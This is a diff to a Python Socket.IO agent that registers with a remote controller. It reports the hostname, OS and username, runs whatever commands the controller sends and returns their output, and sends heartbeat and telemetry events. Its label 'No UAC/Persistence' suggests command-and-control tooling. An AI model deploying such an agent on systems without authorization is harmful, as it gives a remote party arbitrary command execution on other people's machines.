@@ -131,8 +131,39 @@ def connect():
     log(f"Agent ID: {AGENT_ID}")
     log(f"Agent Type: Pure Agent (No UAC/Persistence)")
     
-    # Register agent with controller
-    sio.emit('register_agent', get_system_info())
+    # Register agent with controller using agent_connect event (controller.py expects this)
+    system_info = get_system_info()
+    
+    registration_data = {
+        'agent_id': AGENT_ID,
+        'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
+        'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
+        'ip': 'Auto-detected',
+        'capabilities': ['commands', 'system_info'],
+        'cpu_usage': system_info.get('cpu_usage', 0),
+        'memory_usage': system_info.get('memory_percent', 0),
+        'network_usage': 0,
+        'system_info': {
+            'hostname': AGENT_INFO['hostname'],
+            'os': AGENT_INFO['os'],
+            'os_version': AGENT_INFO['os_version'],
+            'architecture': AGENT_INFO['architecture'],
+            'username': AGENT_INFO['username'],
+            'python_version': AGENT_INFO['python_version']
+        },
+        'uptime': system_info.get('uptime', 0)
+    }
+    
+    log(f"Sending agent_connect event with data: {registration_data}")
+    sio.emit('agent_connect', registration_data)
+    
+    # Also send agent_register for compatibility
+    sio.emit('agent_register', {
+        'agent_id': AGENT_ID,
+        'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
+        'python_version': AGENT_INFO['python_version'],
+        'timestamp': time.time()
+    })
 
 @sio.event
 def connect_error(data):
@@ -146,31 +177,30 @@ def disconnect():
 
 @sio.on('command')
 def on_command(data):
-    """Handle command from controller - original controller.py format"""
+    """Handle command from controller - matches controller.py line 3168"""
     try:
         command = data.get('command', '')
-        agent_id = data.get('agent_id', '')
+        execution_id = data.get('execution_id', '')
         
-        # Check if command is for us
-        if agent_id and agent_id != AGENT_ID:
-            return
-        
-        log(f"Received command: {command}")
+        log(f"📨 Received 'command' event: {command} (execution_id: {execution_id})")
         
         # Execute command
         output = execute_command(command)
         
-        # Send result back to controller
+        # Send result back to controller using command_result event
         sio.emit('command_result', {
             'agent_id': AGENT_ID,
             'command': command,
             'output': output,
             'success': True,
+            'execution_id': execution_id,
             'timestamp': time.time()
         })
         
+        log(f"✅ Sent command_result for: {command}")
+        
     except Exception as e:
-        log(f"Error handling command: {e}")
+        log(f"❌ Error handling command: {e}")
         sio.emit('command_result', {
             'agent_id': AGENT_ID,
             'output': f"Error: {str(e)}",
@@ -233,12 +263,45 @@ def on_get_system_info(data):
 def on_ping(data):
     """Handle ping request from controller"""
     try:
-        sio.emit('pong', {
-            'agent_id': AGENT_ID,
-            'timestamp': time.time()
-        })
+        # Controller sends ping, we respond with pong
+        # But we also send ping ourselves in heartbeat
+        pass  # Already handled in heartbeat
     except Exception as e:
         log(f"Error handling ping: {e}")
+
+@sio.on('pong')
+def on_pong(data):
+    """Handle pong response from controller"""
+    try:
+        # Controller responds to our ping with pong
+        log(f"✅ Received pong from controller - Connection alive")
+    except Exception as e:
+        log(f"Error handling pong: {e}")
+
+@sio.on('agent_registered')
+def on_agent_registered(data):
+    """Handle registration confirmation from controller"""
+    try:
+        log(f"✅ Agent successfully registered with controller!")
+        log(f"Registration confirmed: {data}")
+    except Exception as e:
+        log(f"Error handling registration confirmation: {e}")
+
+@sio.on('registration_error')
+def on_registration_error(data):
+    """Handle registration error from controller"""
+    try:
+        log(f"❌ Registration error: {data.get('message', 'Unknown error')}")
+    except Exception as e:
+        log(f"Error handling registration error: {e}")
+
+@sio.on('agent_list_update')
+def on_agent_list_update(data):
+    """Handle agent list update from controller"""
+    try:
+        log(f"📋 Agent list update received - {len(data) if isinstance(data, dict) else 0} agents")
+    except Exception as e:
+        log(f"Error handling agent list update: {e}")
 
 @sio.on('shutdown')
 def on_shutdown(data):
@@ -300,11 +363,17 @@ def heartbeat():
     while True:
         try:
             if sio.connected:
-                sio.emit('heartbeat', {
+                # Send agent_heartbeat (controller.py expects this)
+                sio.emit('agent_heartbeat', {
                     'agent_id': AGENT_ID,
-                    'status': 'online',
-                    'type': 'pure_agent',
                     'timestamp': time.time()
+                })
+                
+                # Also send ping for keep-alive
+                sio.emit('ping', {
+                    'agent_id': AGENT_ID,
+                    'timestamp': time.time(),
+                    'uptime': time.time() - psutil.boot_time()
                 })
             time.sleep(30)
         except Exception as e:
@@ -317,10 +386,26 @@ def status_update():
         try:
             if sio.connected:
                 info = get_system_info()
-                sio.emit('agent_status', {
+                
+                # Send agent_telemetry (controller.py line 3499)
+                sio.emit('agent_telemetry', {
                     'agent_id': AGENT_ID,
-                    'status': info,
+                    'cpu_usage': info.get('cpu_usage', 0),
+                    'memory_usage': info.get('memory_percent', 0),
+                    'network_usage': 0,
+                    'uptime': info.get('uptime', 0),
                     'timestamp': time.time()
+                })
+                
+                # Also update agent_connect to refresh status
+                sio.emit('agent_connect', {
+                    'agent_id': AGENT_ID,
+                    'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
+                    'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
+                    'cpu_usage': info.get('cpu_usage', 0),
+                    'memory_usage': info.get('memory_percent', 0),
+                    'network_usage': 0,
+                    'uptime': info.get('uptime', 0)
                 })
             time.sleep(60)
         except Exception as e:
